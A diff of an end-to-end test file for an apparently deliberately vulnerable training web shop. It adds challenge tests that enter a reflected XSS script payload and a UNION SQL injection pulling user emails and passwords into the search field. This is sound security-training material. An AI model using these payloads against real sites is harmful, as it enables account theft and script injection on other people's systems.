@@ -1,29 +1,44 @@
 'use strict';
 
-describe('search', function () {
+describe('/#/search', function () {
+
+    var searchQuery, searchButton;
 
     beforeEach(function () {
         browser.get('/#/search'); // not really necessary as search field is part of navbar on every dialog
+        searchQuery = element(by.model('searchQuery'));
+        searchButton = element(by.id('searchButton'));
     });
 
-    it('should show matching products for name when performing search with criteria', function () {
-        element(by.model('searchQuery')).sendKeys('Apple');
+    describe('challenge "xss1"', function () {
 
-        element(by.id('searchButton')).click();
+        it('search query should be susceptible to reflected XSS attacks', function () {
+            searchQuery.sendKeys('<script>alert("XSS1")</script>');
+            searchButton.click();
 
-        var productNames = element.all(by.repeater('product in products').column('name'));
-        expect(productNames.count()).toBe(1);
-        expect(productNames.first().getText()).toMatch('Apple');
+            browser.switchTo().alert().then(function (alert) {
+                expect(alert.getText()).toEqual('XSS1');
+                alert.accept();
+            });
+
+        });
+
+        protractor.expect.challengeSolved({challenge: 'xss1'});
+
     });
 
-    it('should show matching products for description when performing search with criteria', function () {
-        element(by.model('searchQuery')).sendKeys('hand-picked');
+    describe('challenge "unionSqlI"', function () {
 
-        element(by.id('searchButton')).click();
+        it('search query should be susceptible to UNION SQL injection attacks', function () {
+            searchQuery.sendKeys('\') union select null,id,email,password,null,null,null from users--');
+            searchButton.click();
 
-        var productDescriptions = element.all(by.repeater('product in products').column('description'));
-        expect(productDescriptions.count()).toBe(1);
-        expect(productDescriptions.first().getText()).toMatch('hand-picked');
+            var productDescriptions = element.all(by.repeater('product in products').column('description'));
+            expect(productDescriptions.first().getText()).toMatch(/admin@juice-sh.op/);
+        });
+
+        protractor.expect.challengeSolved({challenge: 'unionSqlI'});
+
     });
 
 });
